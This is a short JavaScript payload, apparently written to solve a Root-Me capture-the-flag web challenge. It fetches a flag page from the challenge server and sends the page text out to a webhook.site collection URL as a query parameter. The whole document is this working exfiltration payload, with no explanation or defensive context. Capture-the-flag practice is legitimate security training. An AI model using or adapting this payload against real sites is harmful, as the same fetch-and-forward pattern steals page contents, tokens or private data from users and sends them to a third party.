a=await fetch("http://challenge01.root-me.org:58007/flag")
b=await a.text()
c=fetch("https://webhook.site/db745ab0-1770-43e8-a2e9-6ea374d07163?contenu="+encodeURI(b))
